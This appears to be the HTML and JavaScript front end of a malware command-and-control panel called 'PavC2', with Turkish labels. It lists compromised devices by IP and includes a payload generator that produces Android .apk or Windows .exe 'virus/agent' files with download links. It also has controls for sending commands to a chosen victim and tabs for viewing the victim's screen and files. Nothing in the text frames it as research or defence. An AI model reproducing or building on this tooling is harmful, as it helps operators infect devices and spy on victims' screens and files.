<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>PavC2 - Control Station</title>
    <link rel="stylesheet" href="/style.css">
</head>
<body>

<h1>PavC2 // Dashboard</h1>

<div class="grid">
    <div class="panel">
        <h3 class="panel-title">Cihaz Listesi</h3>
        <table>
            <thead>
                <tr><th>ID</th><th>IP</th><th>DURUM</th></tr>
            </thead>
            <tbody id="client-table"></tbody>
        </table>

        <h3 class="panel-title" style="margin-top: 30px;">Payload Generator</h3>
        <label style="font-size:12px; color:var(--text-muted);">Dosya Adı:</label>
        <input type="text" id="gen-name" placeholder="agent_setup">
        <label style="font-size:12px; color:var(--text-muted);">Platform Tipi:</label>
        <select id="gen-type">
            <option value="apk">Android (.apk)</option>
            <option value="exe">Windows (.exe)</option>
        </select>
        <button onclick="generatePayload()" style="background-color: var(--accent-pink);">VİRÜS / AJAN ÜRET</button>
        <div id="gen-result" style="font-size:12px; margin-top:8px; word-break:break-all;"></div>
    </div>

    <div class="panel">
        <h3 class="panel-title">Operasyon Ekranı</h3>
        <input type="text" id="target-id" readonly placeholder="Cihaz seçilmedi..." style="color:var(--accent-soft); font-weight:600;">

        <div class="tabs">
            <button class="tab-btn active" onclick="switchTab('term-tab', this)">Komutlar</button>
            <button class="tab-btn" onclick="switchTab('scr-tab', this)">Ekran</button>
            <button class="tab-btn" onclick="switchTab('fl-tab', this)">Dosyalar</button>
        </div>

        <div id="term-tab" class="tab-content active">
            <select id="command-id">
                <option value="1">CMD_PING</option>
                <option value="2">CMD_SYSINFO</option>
            </select>
            <button onclick="sendCommand()">KOMUT GÖNDER</button>
        </div>

        <div id="scr-tab" class="tab-content">
            <div class="screen-view">
                <img id="live-screen" src="" style="display:none;">
                <span id="scr-placeholder">Ekran Akışı Yok</span>
            </div>
        </div>

        <div id="fl-tab" class="tab-content">
            <div class="file-list" id="file-container"></div>
        </div>
    </div>
</div>

<script>
    let selectedId = "";

    function switchTab(tabId, btn) {
        document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
        document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
        document.getElementById(tabId).classList.add('active');
        btn.classList.add('active');
    }

    async function generatePayload() {
        const filename = document.getElementById('gen-name').value;
        const type = document.getElementById('gen-type').value;
        const out = document.getElementById('gen-result');
        if(!filename) return alert("Dosya adı girin.");

        out.innerText = "Üretiliyor...";
        try {
            const res = await fetch('/api/generate', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ filename, type })
            });
            const data = await res.json();
            if(data.success) {
                out.innerHTML = `Link hazır: <a href="${data.downloadUrl}" target="_blank" style="color:var(--accent-soft); font-weight:600;">İndir</a>`;
            } else { out.innerText = "Hata oluştu."; }
        } catch(e) { out.innerText = "Bağlantı hatası."; }
    }

    async function fetchClients() {
        try {
            const res = await fetch('/api/clients');
            const data = await res.json();
            const tbody = document.getElementById('client-table');
            tbody.innerHTML = '';
            data.forEach(c => {
                const tr = document.createElement('tr');
                tr.onclick = () => {
                    selectedId = c.id;
                    document.getElementById('target-id').value = c.id;
                };
                tr.innerHTML = `<td>${c.id}</td><td>${c.ip}</td><td class="status online">${c.status}</td>`;
                tbody.appendChild(tr);
            });
        } catch(e) {}
    }

    async function sendCommand() {
        if(!selectedId) return alert("Cihaz seçin.");
        const commandId = document.getElementById('command-id').value;
        await fetch('/api/command', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ clientId: selectedId, commandId })
        });
    }

    setInterval(fetchClients, 2000);
</script>
</body>
</html>
